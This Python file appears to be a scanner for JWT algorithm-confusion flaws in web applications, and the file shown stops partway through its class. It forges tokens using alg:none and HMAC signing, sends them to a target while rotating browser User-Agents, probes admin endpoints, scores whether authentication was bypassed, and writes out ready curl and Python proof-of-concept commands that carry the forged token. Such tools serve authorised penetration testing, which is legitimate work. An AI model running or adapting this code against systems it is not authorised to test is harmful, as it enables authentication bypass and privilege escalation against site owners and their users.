#!/usr/bin/env python3
"""
JWT Algorithm Confusion Scanner

This tool tests for JWT algorithm confusion vulnerabilities by attempting various
attack vectors including alg:none, algorithm switching, and key confusion attacks.
"""

import argparse
import json
import base64
import hmac
import hashlib
import requests
from typing import Dict, List, Tuple, Optional, Any
import urllib3
import sys
import time
from colorama import init, Fore, Style
import re
import random

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init()

# List of common User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
]

class JWTConfusionScanner:
    def __init__(self, 
                 target_url: str, 
                 cookie_name: Optional[str] = None,
                 auth_header: bool = False, 
                 token: Optional[str] = None,
                 public_key_path: Optional[str] = None,
                 custom_payloads: Optional[List[Dict]] = None,
                 verification_endpoint: Optional[str] = None,
                 verification_strings: Optional[Dict[str, List[str]]] = None,
                 verbose: bool = False,
                 delay: float = 0.5):
        """
        Initialize the JWT Confusion Scanner
        
        Args:
            target_url: URL to test
            cookie_name: Name of the cookie containing the JWT
            auth_header: Whether to use Authorization header
            token: JWT token to test (if not provided, will try to extract from request)
            public_key_path: Path to public key file (if available)
            custom_payloads: List of custom payloads to try
            verification_endpoint: Secondary URL to verify privilege escalation
            verification_strings: Dict with 'success' and 'failure' lists of strings to detect in responses
            verbose: Enable verbose output
            delay: Delay between requests to avoid rate limiting
        """
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.auth_header = auth_header
        self.token = token
        self.public_key = None
        self.verbose = verbose
        self.delay = delay
        self.custom_payloads = custom_payloads or []
        self.session = requests.Session()
        self.verification_endpoint = verification_endpoint or target_url
        
        # Set baseline response properties to compare against
        self.baseline_valid_response = None
        self.baseline_invalid_response = None
        
        # Success indicators - patterns that might indicate successful exploitation
        if verification_strings and 'success' in verification_strings:
            self.success_indicators = verification_strings['success']
        else:
            self.success_indicators = [
                "admin", "authenticated", "authorized", "welcome", "dashboard", 
                "success", "valid", "profile", "account", "logged in"
            ]
            
        # Failure indicators - patterns that might indicate failed exploitation
        if verification_strings and 'failure' in verification_strings:
            self.failure_indicators = verification_strings['failure']
        else:
            self.failure_indicators = [
                "invalid token", "invalid signature", "unauthorized", "unauthenticated",
                "expired", "forbidden", "not allowed", "access denied", "login required"
            ]
        
        # Load public key if provided
        if public_key_path:
            try:
                with open(public_key_path, 'r') as f:
                    self.public_key = f.read().strip()
                print(f"{Fore.GREEN}[+] Loaded public key from {public_key_path}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to load public key: {str(e)}{Style.RESET_ALL}")
    
    def _print_verbose(self, message: str):
        """Print message only if verbose mode is enabled"""
        if self.verbose:
            print(message)
    
    def _decode_jwt(self, token: str) -> Tuple[Dict, Dict, str]:
        """
        Decode JWT without verification
        
        Returns:
            Tuple of (header, payload, signature)
        """
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
            
        def decode_part(part):
            # Add padding if necessary
            padded = part + '=' * (4 - len(part) % 4) if len(part) % 4 else part
            return json.loads(base64.urlsafe_b64decode(padded).decode('utf-8'))
        
        header = decode_part(parts[0])
        payload = decode_part(parts[1])
        signature = parts[2]
        
        return header, payload, signature
    
    def _encode_jwt_part(self, part: Dict) -> str:
        """Encode a JWT part (header or payload)"""
        json_str = json.dumps(part, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode('utf-8')
        return encoded.rstrip('=')  # Remove padding
    
    def _create_token(self, header: Dict, payload: Dict, key: str = '') -> str:
        """
        Create a JWT token with the given header, payload, and key
        
        Args:
            header: JWT header
            payload: JWT payload
            key: Key to use for signing (empty for none algorithm)
            
        Returns:
            JWT token string
        """
        header_encoded = self._encode_jwt_part(header)
        payload_encoded = self._encode_jwt_part(payload)
        
        unsigned_token = f"{header_encoded}.{payload_encoded}"
        
        if header.get('alg') == 'none' or header.get('alg') == 'None' or not header.get('alg'):
            # No signature for 'none' algorithm
            signature = ""
        elif header.get('alg') == 'HS256':
            # HMAC-SHA256
            signature = hmac.new(
                key.encode(), 
                unsigned_token.encode(), 
                hashlib.sha256
            ).digest()
            signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
        elif header.get('alg') == 'HS384':
            # HMAC-SHA384
            signature = hmac.new(
                key.encode(), 
                unsigned_token.encode(), 
                hashlib.sha384
            ).digest()
            signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
        elif header.get('alg') == 'HS512':
            # HMAC-SHA512
            signature = hmac.new(
                key.encode(), 
                unsigned_token.encode(), 
                hashlib.sha512
            ).digest()
            signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
        else:
            # For other algorithms (RS256, ES256, etc.), we can't sign properly
            # Just use an empty signature for testing
            signature = ""
            
        return f"{unsigned_token}.{signature}"
    
    def _make_request(self, token: str) -> requests.Response:
        """Make a request with the given token"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS)
        }
        cookies = {}
        
        if self.auth_header:
            headers['Authorization'] = f"Bearer {token}"
        elif self.cookie_name:
            cookies[self.cookie_name] = token
        else:
            # If no method specified, try both
            headers['Authorization'] = f"Bearer {token}"
            # Also try to set a few common cookie names
            for name in ['jwt', 'token', 'access_token', 'id_token', 'session']:
                cookies[name] = token
        
        try:
            response = self.session.get(
                self.target_url,
                headers=headers,
                cookies=cookies,
                verify=False,
                allow_redirects=True,
                timeout=10
            )
            # Add delay to avoid rate limiting
            time.sleep(self.delay)
            return response
        except requests.RequestException as e:
            print(f"{Fore.RED}[!] Request error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _establish_baselines(self, orig_token: str):
        """
        Establish baseline responses for valid and invalid tokens for comparison
        
        Args:
            orig_token: The original valid JWT token
        """
        print(f"{Fore.BLUE}[*] Establishing baseline responses...{Style.RESET_ALL}")
        
        # Get baseline for valid token
        print(f"{Fore.BLUE}[*] Getting baseline for valid token...{Style.RESET_ALL}")
        self.baseline_valid_response = self._make_request(orig_token)
        
        if not self.baseline_valid_response:
            print(f"{Fore.RED}[!] Failed to get baseline for valid token{Style.RESET_ALL}")
            return
            
        # Save important aspects of the valid response
        self.valid_status = self.baseline_valid_response.status_code
        self.valid_content_length = len(self.baseline_valid_response.content)
        self.valid_headers = dict(self.baseline_valid_response.headers)
        
        # Try to extract cookies, redirects, etc.
        self.valid_cookies = dict(self.baseline_valid_response.cookies)
        self.valid_redirects = [r.url for r in self.baseline_valid_response.history]
        
        # Create an invalid token by tampering with the signature
        parts = orig_token.split('.')
        if len(parts) == 3:
            invalid_token = f"{parts[0]}.{parts[1]}.invalidinvalidinvalid"
            
            print(f"{Fore.BLUE}[*] Getting baseline for invalid token...{Style.RESET_ALL}")
            self.baseline_invalid_response = self._make_request(invalid_token)
            
            if not self.baseline_invalid_response:
                print(f"{Fore.RED}[!] Failed to get baseline for invalid token{Style.RESET_ALL}")
                return
                
            # Save important aspects of the invalid response
            self.invalid_status = self.baseline_invalid_response.status_code
            self.invalid_content_length = len(self.baseline_invalid_response.content)
            self.invalid_headers = dict(self.baseline_invalid_response.headers)
            self.invalid_cookies = dict(self.baseline_invalid_response.cookies)
            self.invalid_redirects = [r.url for r in self.baseline_invalid_response.history]
            
            print(f"{Fore.GREEN}[+] Baselines established:{Style.RESET_ALL}")
            print(f"    Valid token: Status {self.valid_status}, Content Length: {self.valid_content_length}")
            print(f"    Invalid token: Status {self.invalid_status}, Content Length: {self.invalid_content_length}")
        else:
            print(f"{Fore.RED}[!] Could not create invalid token for baseline{Style.RESET_ALL}")
    
    def _evaluate_response(self, response: requests.Response, attack_type: str) -> Dict[str, Any]:
        """
        Analyze response to determine if the attack was successful
        
        Returns:
            Dictionary with detailed analysis results
        """
        if not response:
            return {"success": False, "confidence": 0, "reason": "No response received"}
            
        # Start with initial confidence level
        initial_confidence = 0
        result = {"success": False, "confidence": 0, "details": {}}
        
        # Compare with baselines if available
        if self.baseline_valid_response and self.baseline_invalid_response:
            # Check if valid and invalid baselines are too similar to each other
            # This would indicate the site is likely ignoring JWT tokens entirely
            baseline_similarity = self._calculate_similarity(self.baseline_valid_response, self.baseline_invalid_response)
            
            if baseline_similarity > 0.8:
                print(f"{Fore.YELLOW}[!] Warning: Valid and invalid baseline responses are very similar ({baseline_similarity:.2f}){Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] This suggests the site may be ignoring JWT tokens entirely{Style.RESET_ALL}")
                initial_confidence -= 50  # Significantly reduce confidence
                result["details"]["baseline_warning"] = f"Valid and invalid baselines are {baseline_similarity:.2f} similar"
            
            # Check if response is more similar to valid than invalid baseline
            valid_similarity = self._calculate_similarity(response, self.baseline_valid_response)
            invalid_similarity = self._calculate_similarity(response, self.baseline_invalid_response)
            
            result["details"]["valid_similarity"] = valid_similarity
            result["details"]["invalid_similarity"] = invalid_similarity
            
            print(f"{Fore.BLUE}[*] Response similarity - Valid: {valid_similarity:.2f}, Invalid: {invalid_similarity:.2f}{Style.RESET_ALL}")
            
            # If response is clearly more similar to valid baseline
            if valid_similarity > invalid_similarity + 0.3:  # 30% threshold
                initial_confidence += 40  # Strong indicator
                result["details"]["baseline_comparison"] = "More similar to valid response"
                print(f"{Fore.GREEN}[+] Response is significantly more similar to valid token response{Style.RESET_ALL}")
            elif valid_similarity > invalid_similarity + 0.1:  # 10% threshold
                initial_confidence += 20  # Moderate indicator
                result["details"]["baseline_comparison"] = "Somewhat similar to valid response"
                print(f"{Fore.YELLOW}[+] Response is somewhat similar to valid token response{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Response is not similar to valid token response{Style.RESET_ALL}")
                initial_confidence -= 20  # Penalize for not being similar to valid response
        else:
            print(f"{Fore.YELLOW}[!] No baseline responses available for comparison{Style.RESET_ALL}")
        
        # Check status code 
        result["details"]["status_code"] = response.status_code
        if response.status_code < 400:
            initial_confidence += 20
            print(f"{Fore.YELLOW}[*] Got non-error status code: {response.status_code}{Style.RESET_ALL}")
        elif response.status_code >= 500:
            # Server errors might indicate successful exploitation in some cases
            initial_confidence += 5
            result["details"]["server_error"] = True
            print(f"{Fore.YELLOW}[*] Server error response: {response.status_code}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Error status code: {response.status_code}{Style.RESET_ALL}")
        
        # Check for success indicators in response text
        success_indicators_found = []
        for indicator in self.success_indicators:
            # More contextual check for success indicators
            # Look for indicators in specific contexts, not just anywhere in the page
            if self._check_indicator_in_context(response.text, indicator):
                success_indicators_found.append(indicator)
                initial_confidence += 15  # Add confidence for each success indicator
        
        if success_indicators_found:
            result["details"]["success_indicators_found"] = success_indicators_found
            print(f"{Fore.GREEN}[+] Success indicators found: {', '.join(success_indicators_found)}{Style.RESET_ALL}")
        
        # Check for failure indicators in response text
        failure_indicators_found = []
        for indicator in self.failure_indicators:
            if indicator.lower() in response.text.lower():
                failure_indicators_found.append(indicator)
                initial_confidence -= 20  # Reduce confidence for each failure indicator
        
        if failure_indicators_found:
            result["details"]["failure_indicators_found"] = failure_indicators_found
            print(f"{Fore.RED}[-] Failure indicators found: {', '.join(failure_indicators_found)}{Style.RESET_ALL}")
        
        # Check for sensitive data in response that might indicate successful attack
        sensitive_data_found = []
        try:
            if 'application/json' in response.headers.get('Content-Type', ''):
                data = response.json()
                # Look for interesting fields that might indicate success
                interesting_fields = ['user', 'admin', 'role', 'permissions', 'email', 'username']
                for field in interesting_fields:
                    if field in str(data).lower():
                        sensitive_data_found.append(field)
                        initial_confidence += 15
        except:
            pass
            
        if sensitive_data_found:
            result["details"]["sensitive_data_found"] = sensitive_data_found
            print(f"{Fore.GREEN}[+] Sensitive data found: {', '.join(sensitive_data_found)}{Style.RESET_ALL}")
        
        # Compare content length with baselines
        if self.baseline_valid_response and self.baseline_invalid_response:
            valid_len = len(self.baseline_valid_response.content)
            invalid_len = len(self.baseline_invalid_response.content)
            current_len = len(response.content)
            
            # Calculate how close the response is to valid vs invalid length
            valid_len_diff = abs(current_len - valid_len)
            invalid_len_diff = abs(current_len - invalid_len)
            
            print(f"{Fore.BLUE}[*] Content length - Current: {current_len}, Valid: {valid_len}, Invalid: {invalid_len}{Style.RESET_ALL}")
            
            # If valid and invalid lengths are very close to each other, this is suspicious
            if abs(valid_len - invalid_len) < 0.05 * max(valid_len, invalid_len):  # Less than 5% difference
                print(f"{Fore.YELLOW}[!] Warning: Valid and invalid baseline content lengths are very similar{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] This suggests the site may be ignoring JWT tokens{Style.RESET_ALL}")
                initial_confidence -= 30
            
            # If response length is closer to valid than invalid
            if valid_len_diff < invalid_len_diff:
                # If they're significantly different
                if invalid_len_diff > 2 * valid_len_diff:
                    initial_confidence += 15
                    print(f"{Fore.GREEN}[+] Response length is much closer to valid response{Style.RESET_ALL}")
                else:
                    initial_confidence += 5
                    print(f"{Fore.YELLOW}[+] Response length is somewhat closer to valid response{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Response length is closer to invalid response{Style.RESET_ALL}")
                initial_confidence -= 10  # Penalize for being closer to invalid response
        
        # Finalize confidence score (cap between 0-100)
        confidence = max(0, min(100, initial_confidence))
        result["confidence"] = confidence
        
        # Determine success based on confidence threshold
        if confidence >= 70:  # Increased threshold for high confidence
            result["success"] = True
            result["reason"] = "High confidence of successful exploitation"
        elif confidence >= 50:  # Increased threshold for medium confidence
            result["success"] = True  
            result["reason"] = "Medium confidence of successful exploitation"
        else:
            result["success"] = False
            result["reason"] = "Low confidence of successful exploitation"
            
        # Report confidence level
        confidence_label = "HIGH" if confidence >= 70 else "MEDIUM" if confidence >= 50 else "LOW"
        print(f"{Fore.BLUE}[*] Final confidence: {confidence}% ({confidence_label}){Style.RESET_ALL}")
        
        # Final assessment
        if result["success"]:
            print(f"{Fore.GREEN}[+] Assessment: Potentially vulnerable to this attack vector{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Assessment: Not vulnerable to this attack vector{Style.RESET_ALL}")
        
        return result
    
    def _calculate_similarity(self, response1: requests.Response, response2: requests.Response) -> float:
        """
        Calculate similarity between two responses (0.0 to 1.0)
        """
        similarity = 0.0
        total_weight = 0
        
        # Status code similarity (weight: 3)
        if response1.status_code == response2.status_code:
            similarity += 3
        elif abs(response1.status_code - response2.status_code) < 100:
            similarity += 1
        total_weight += 3
        
        # Content length similarity (weight: 2)
        len1 = len(response1.content)
        len2 = len(response2.content)
        if len1 > 0 and len2 > 0:
            ratio = min(len1, len2) / max(len1, len2)
            similarity += 2 * ratio
            total_weight += 2
        
        # Content similarity (weight: 5) - simplified using string overlap
        text1 = response1.text.lower()
        text2 = response2.text.lower()
        
        # Get sample phrases for comparison - more efficient than full content
        samples = []
        words = text1.split()
        if len(words) > 20:
            # Sample 3-word phrases from different parts of the document
            quarter = len(words) // 4
            samples.extend([" ".join(words[i:i+3]) for i in range(quarter, 3*quarter, quarter//2)])
        else:
            # For short documents, use the whole text
            samples.append(text1[:100])
        
        matches = 0
        for sample in samples:
            if sample in text2:
                matches += 1
                
        content_similarity = matches / max(1, len(samples))
        similarity += 5 * content_similarity
        total_weight += 5
        
        # Headers similarity (weight: 2)
        common_headers = set(response1.headers.keys()) & set(response2.headers.keys())
        header_similarity = len(common_headers) / max(1, len(set(response1.headers.keys()) | set(response2.headers.keys())))
        similarity += 2 * header_similarity
        total_weight += 2
        
        # Calculate final similarity (0.0 to 1.0)
        return similarity / total_weight if total_weight > 0 else 0.0
    
    def _generate_poc(self, vuln: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a Proof of Concept for a verified vulnerability
        
        Args:
            vuln: Dictionary containing vulnerability details
                
        Returns:
            Dictionary with POC details
        """
        print(f"\n{Fore.GREEN}[+] Generating Proof of Concept for {vuln['attack_type']}{Style.RESET_ALL}")
        
        # Extract needed data
        attack_type = vuln['attack_type']
        attack_token = vuln['token']
        description = vuln['description']
        
        poc_result = {
            "attack_type": attack_type,
            "attack_token": attack_token,
            "description": description,
            "evidence": [],
            "curl_command": "",
            "python_script": ""
        }
        
        try:
            # Get decoded details of forged token
            forged_header, forged_payload, _ = self._decode_jwt(attack_token)
            
            # Define endpoints to test for privilege differences
            test_endpoints = [self.target_url]  # Main URL
            
            # If we have a verification endpoint, add it
            if self.verification_endpoint and self.verification_endpoint != self.target_url:
                test_endpoints.append(self.verification_endpoint)
                
            # Also try to detect common admin/profile endpoints
            base_url = '/'.join(self.target_url.split('/')[:3])  # Get domain portion
            common_paths = ['/admin', '/dashboard', '/profile', '/account', '/settings', '/api/admin', '/api/v1/admin']
            test_endpoints.extend(f"{base_url}{path}" for path in common_paths)
            
            # Make requests with the original token and the forged token to compare
            original_token = self._get_original_token()
            evidence_items = []
            
            # Limit to first 3 endpoints to avoid excessive requests
            for endpoint in test_endpoints[:3]:
                try:
                    print(f"{Fore.BLUE}[*] Testing endpoint: {endpoint}{Style.RESET_ALL}")
                    
                    # Test with original token
                    original_url = self.target_url
                    self.target_url = endpoint
                    original_response = self._make_request(original_token)
                    
                    # Test with attack token
                    attack_response = self._make_request(attack_token)
                    
                    # Reset target URL
                    self.target_url = original_url
                    
                    if not original_response or not attack_response:
                        continue
                        
                    # Compare responses
                    original_status = original_response.status_code
                    attack_status = attack_response.status_code
                    
                    original_length = len(original_response.content)
                    attack_length = len(attack_response.content)
                    
                    # Check for significant differences
                    status_different = original_status != attack_status
                    length_difference = abs(original_length - attack_length) > 100  # More than 100 bytes difference
                    
                    # Extract interesting parts of the responses
                    original_interesting = self._extract_interesting_content(original_response.text)
                    attack_interesting = self._extract_interesting_content(attack_response.text)
                    
                    content_different = original_interesting != attack_interesting
                    
                    if status_different or length_difference or content_different:
                        evidence_items.append({
                            "endpoint": endpoint,
                            "original_status": original_status,
                            "attack_status": attack_status,
                            "original_length": original_length,
                            "attack_length": attack_length,
                            "original_sample": original_interesting[:200] + "..." if len(original_interesting) > 200 else original_interesting,
                            "attack_sample": attack_interesting[:200] + "..." if len(attack_interesting) > 200 else attack_interesting,
                            "differences": {
                                "status": status_different,
                                "length": length_difference,
                                "content": content_different
                            }
                        })
                except Exception as e:
                    print(f"{Fore.RED}[!] Error generating POC for endpoint {endpoint}: {str(e)}{Style.RESET_ALL}")
            
            # Find the endpoint with the most significant differences for curl command
            best_endpoint = self.target_url
            if evidence_items:
                # Prioritize endpoints with more differences
                for item in evidence_items:
                    if sum(1 for v in item["differences"].values() if v) >= 2:
                        best_endpoint = item["endpoint"]
                        break
            
            # Generate curl command
            curl_cmd = self._generate_curl_poc(best_endpoint, attack_token, self.cookie_name)
            
            # Generate simple Python script
            python_script = self._generate_python_poc(best_endpoint, attack_token, self.cookie_name)
            
            # Compile final POC
            poc_result["evidence"] = evidence_items
            poc_result["curl_command"] = curl_cmd
            poc_result["python_script"] = python_script
            poc_result["original_token_data"] = {
                "header": self._decode_jwt(original_token)[0],
                "payload": self._decode_jwt(original_token)[1]
            }
            poc_result["attack_token_data"] = {
                "header": forged_header,
                "payload": forged_payload
            }
            
            return poc_result
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error generating POC: {str(e)}{Style.RESET_ALL}")
            return {"error": str(e)}

    def _extract_interesting_content(self, html_content: str) -> str:
        """
        Extract interesting parts from HTML/JSON responses
        
        Args:
            html_content: HTML or JSON content
            
        Returns:
            String with interesting parts
        """
        if not html_content:
            return "Empty content"
            
        try:
            # Check if content is JSON
            try:
                json_data = json.loads(html_content)
                # Extract interesting JSON fields - using a set for faster lookups
                interesting_keys = {
                    'user', 'admin', 'role', 'roles', 'permissions', 'isAdmin', 
                    'is_admin', 'authenticated', 'auth', 'account', 'profile', 
                    'username', 'email', 'id'
                }
                
                # Dictionary comprehension for better performance
                interesting_fields = {
                    key: json_data[key] for key in interesting_keys 
                    if key in json_data
                }
                
                # If we found interesting fields, return those
                if interesting_fields:
                    return json.dumps(interesting_fields)
                # Otherwise, return compact JSON
                return json.dumps(json_data, separators=(',', ':'))[:500]
            except json.JSONDecodeError:
                pass
                
            # Try to extract interesting HTML content
            interesting_content = []
            
            # Look for title
            title_match = re.search(r'<title>(.*?)</title>', html_content)
            if title_match:
                interesting_content.append(f"Title: {title_match.group(1)}")
                
            # Look for h1 headings
            h1_matches = re.findall(r'<h1[^>]*>(.*?)</h1>', html_content)
            if h1_matches:
                interesting_content.append(f"Headings: {', '.join(h1_matches[:3])}")
                
            # Look for admin/dashboard elements
            admin_pattern = r'<[^>]*class=["\'](?:[^"\']*\s)?(?:admin|dashboard|account|profile)[^"\']*["\'][^>]*>'
            admin_matches = re.findall(admin_pattern, html_content)
            if admin_matches:
                interesting_content.append(f"Admin elements found: {len(admin_matches)}")
                
            # If we found anything interesting, return it
            if interesting_content:
                return '\n'.join(interesting_content)
                
            # Otherwise, just return a length notification
            return f"Content length: {len(html_content)} characters"
        except Exception as e:
            return f"Error extracting content: {str(e)}"

    def _generate_curl_poc(self, endpoint: str, token: str, cookie_name: Optional[str] = None) -> str:
        """
        Generate a curl command for proof of concept
        
        Args:
            endpoint: Target URL endpoint
            token: JWT token to use
            cookie_name: Optional cookie name if token is sent via cookie
            
        Returns:
            String with curl command
        """
        # Add secure options: -s (silent), -k (insecure), -i (include headers)
        if cookie_name:
            return f'curl -s -k -X GET "{endpoint}" -b "{cookie_name}={token}" -i'
        return f'curl -s -k -X GET "{endpoint}" -H "Authorization: Bearer {token}" -i'

    def _generate_python_poc(self, endpoint: str, token: str, cookie_name: Optional[str] = None) -> str:
        """
        Generate a Python script for proof of concept
        
        Args:
            endpoint: Target URL endpoint
            token: JWT token to use
            cookie_name: Optional cookie name if token is sent via cookie
            
        Returns:
            String with Python script
        """
        # Add error handling and better formatting to the script
        script_template = """
import requests
from urllib3.exceptions import InsecureRequestWarning
import sys
import json
from typing import Dict, Any

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = "{endpoint}"
{auth_setup}

def print_formatted_json(data: Dict[str, Any]) -> None:
    \"\"\"Print JSON data in a formatted way\"\"\"
    print(json.dumps(data, indent=2, sort_keys=True))

try:
    response = requests.get(url, {auth_param}, verify=False, timeout=10)
    print(f"Status Code: {{response.status_code}}")
    print("\\nHeaders:")
    for key, value in response.headers.items():
        print(f"{{key}}: {{value}}")
    
    print("\\nResponse Body:")
    try:
        # Try to parse as JSON for prettier output
        json_data = response.json()
        print_formatted_json(json_data)
    except ValueError:
        # Not JSON, print as text
        print(response.text)
        
except requests.exceptions.RequestException as e:
    print(f"Error: {{e}}", file=sys.stderr)
    sys.exit(1)
"""
        if cookie_name:
            auth_setup = f'cookies = {{"{cookie_name}": "{token}"}}'
            auth_param = "cookies=cookies"
        else:
            auth_setup = f'headers = {{"Authorization": "Bearer {token}"}}'
            auth_param = "headers=headers"
            
        return script_template.format(
            endpoint=endpoint,
            auth_setup=auth_setup,
            auth_param=auth_param
        )
    
    def _try_attack(self, attack_type: str, token: str, description: str) -> Dict[str, Any]:
        """
        Try an attack with the modified token
        
        Args:
            attack_type: String identifier for the attack type
            token: Modified JWT token
            description: Human-readable description of the attack
            
        Returns:
            Dictionary with detailed attack results
        """
        print(f"\n{Fore.BLUE}[*] Trying {attack_type}: {description}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Modified token: {token[:20]}...{token[-20:]}{Style.RESET_ALL}")
        
        # Initialize attack responses tracking if not already done
        if not hasattr(self, '_attack_responses'):
            self._attack_responses = {}
        
        # First test against main endpoint
        response = self._make_request(token)
        if not response:
            print(f"{Fore.RED}[-] No response received{Style.RESET_ALL}")
            return {"success": False, "confidence": 0, "verified": False, "reason": "No response received"}
        
        # Store this response for future comparisons
        self._attack_responses[attack_type] = response
        
        print(f"{Fore.BLUE}[*] Response status code: {response.status_code}{Style.RESET_ALL}")
        
        # Check if responses from different attacks are too similar
        # This would suggest the site is ignoring the tokens
        if len(self._attack_responses) > 1:
            similar_attacks = []
            for prev_attack, prev_response in self._attack_responses.items():
                if prev_attack != attack_type:
                    similarity = self._calculate_similarity(response, prev_response)
                    if similarity > 0.95:  # Very similar responses for different attacks
                        similar_attacks.append((prev_attack, similarity))
            
            if similar_attacks:
                print(f"{Fore.YELLOW}[!] Warning: Response very similar to previous attacks:{Style.RESET_ALL}")
                for prev_attack, similarity in similar_attacks:
                    print(f"{Fore.YELLOW}[!]   - {prev_attack}: {similarity:.2f} similarity{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] This suggests the site may be ignoring JWT tokens{Style.RESET_ALL}")
        
        # Verify if token is used for authentication
        auth_confidence = self._verify_authentication(token)
        
        # Evaluate initial response
        print(f"{Fore.BLUE}[*] Evaluating response...{Style.RESET_ALL}")
        initial_result = self._evaluate_response(response, attack_type)
        
        # Apply authentication factor to confidence
        auth_factor = 1.0
        if auth_confidence < 0.1:  # Very low authentication confidence
            auth_factor = 0.3  # Reduce final confidence to 30%
            print(f"{Fore.YELLOW}[!] Reducing confidence due to low authentication verification{Style.RESET_ALL}")
        elif auth_confidence < 0.3:  # Low authentication confidence
            auth_factor = 0.6  # Reduce final confidence to 60%
            print(f"{Fore.YELLOW}[!] Slightly reducing confidence due to authentication verification{Style.RESET_ALL}")
        
        # Apply the authentication factor
        adjusted_confidence = int(initial_result["confidence"] * auth_factor)
        initial_result["confidence"] = adjusted_confidence
        initial_result["auth_confidence"] = auth_confidence
        
        print(f"{Fore.BLUE}[*] Adjusted confidence: {adjusted_confidence}% (auth factor: {auth_factor:.2f}){Style.RESET_ALL}")
        
        # If not successful, return immediately
        if not initial_result["success"]:
            print(f"{Fore.RED}[-] Attack unsuccessful: {initial_result['reason']}{Style.RESET_ALL}")
            return {
                "success": False, 
                "confidence": initial_result["confidence"],
                "verified": False,
                "attack_type": attack_type,
                "token": token,
                "description": description,
                "reason": initial_result["reason"],
                "auth_confidence": auth_confidence
            }
            
        # If we have a verification endpoint and it's different from the main endpoint,
        # try to access it with the potentially successful token
        verified = False
        verification_confidence = 0
        if self.verification_endpoint and self.verification_endpoint != self.target_url:
            print(f"{Fore.BLUE}[*] Verifying with secondary endpoint: {self.verification_endpoint}{Style.RESET_ALL}")
            
            # Store original target URL
            original_url = self.target_url
            
            # Set target URL to verification endpoint
            self.target_url = self.verification_endpoint
            
            # Make verification request
            verify_response = self._make_request(token)
            
            # Reset target URL
            self.target_url = original_url
            
            if verify_response:
                # Evaluate verification response
                verify_result = self._evaluate_response(verify_response, f"{attack_type}-verify")
                verification_confidence = verify_result["confidence"]
                
                if verify_result["success"]:
                    verified = True
                    print(f"{Fore.GREEN}[+] Verification successful! High confidence this is exploitable.{Style.RESET_ALL}")
        else:
            # If we don't have a separate verification endpoint, use the initial confidence
            verification_confidence = initial_result["confidence"]
            if verification_confidence >= 80 and auth_confidence > 0.5:  # Only auto-verify if both confidence scores are high
                verified = True
                print(f"{Fore.GREEN}[+] Auto-verified due to high confidence score and authentication verification.{Style.RESET_ALL}")
        
        # Generate POC if vulnerability is verified
        poc_data = None
        if verified:
            print(f"{Fore.BLUE}[*] Generating proof of concept...{Style.RESET_ALL}")
            vuln_data = {
                "attack_type": attack_type,
                "token": token,
                "description": description
            }
            poc_data = self._generate_poc(vuln_data)
        
        # Determine final result
        final_result = {
            "success": initial_result["success"],
            "confidence": max(initial_result["confidence"], verification_confidence),
            "verified": verified,
            "token": token,
            "attack_type": attack_type,
            "description": description,
            "auth_confidence": auth_confidence,
            "initial_response": {
                "status_code": response.status_code,
                "content_length": len(response.content)
            },
            "details": initial_result.get("details", {})
        }
        
        # Add POC data if available
        if poc_data:
            final_result["poc"] = poc_data
        
        # Report findings
        if verified:
            print(f"{Fore.GREEN}[+] VERIFIED VULNERABILITY FOUND! Attack: {attack_type}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Vulnerable token: {token}{Style.RESET_ALL}")
            if poc_data:
                print(f"{Fore.GREEN}[+] Proof of Concept generated{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Curl command: {poc_data.get('curl_command', 'N/A')}{Style.RESET_ALL}")
        elif initial_result["success"]:
            print(f"{Fore.YELLOW}[+] POTENTIAL VULNERABILITY FOUND! Attack: {attack_type}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] Potentially vulnerable token: {token}{Style.RESET_ALL}")
